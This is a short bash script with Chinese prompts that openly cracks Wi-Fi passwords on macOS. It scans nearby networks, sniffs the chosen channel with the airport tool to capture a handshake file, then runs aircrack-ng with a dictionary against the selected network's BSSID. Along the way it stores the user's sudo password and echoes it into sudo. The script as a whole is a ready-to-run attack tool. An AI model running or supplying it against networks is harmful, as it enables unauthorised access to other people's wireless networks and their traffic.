#!/bin/bash
alias airport='/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport'
alias sniff='sudo /usr/libexec/airportd en0 sniff'
dictfile=${1}

function GetSudo () {
    read -s -p "请输入计算机密码: " password
}

function CheckOS () {
    [[ `uname` != 'Darwin' ]] && \
	echo "此脚本为macosx环境破解wifi" && \
	exit
}


function ScanningWifi () {
    local choose="yes"
    while [[ ${choose} = "yes" ]]; do
	airport -s > tmp
	cat tmp
	read -p "是否继续扫描附近的Wi-Fi(多扫描几次可能发现更多的网络):[yes, no]: " choose
    done
}

function ChooseWifi () {
    local ssid
    read -p "输入选择Wi-Fi的SSID: " ssid
    local channel=`cat tmp | grep ${ssid} | awk '{print $4}'`
    local bssid=`cat tmp | grep ${ssid} | awk '{print $2}'`
    channel=${channel%,*}
    echo "channel:${channel} bssid:${bssid}"
    echo ${password} | sudo -S rm /tmp/*.cap > /dev/null 2>&1
    echo ${password} | sudo -S airport en0 sniff ${channel} > /dev/null 2>&1 & 
    echo "抓取数据中，等待5分钟..."
    sleep 80
    echo ${password} | sudo -S pkill airport > /dev/null 2>&1
    local capfile=`ls /tmp/*.cap`
    if [[ $? -eq 0 ]]; then
	echo "capfile: ${capfile}"
	aircrack-ng -b ${bssid} -w ${dictfile} ${capfile}
    fi
    [[ -f tmp ]] && rm tmp
}

GetSudo
CheckOS
ScanningWifi
ChooseWifi
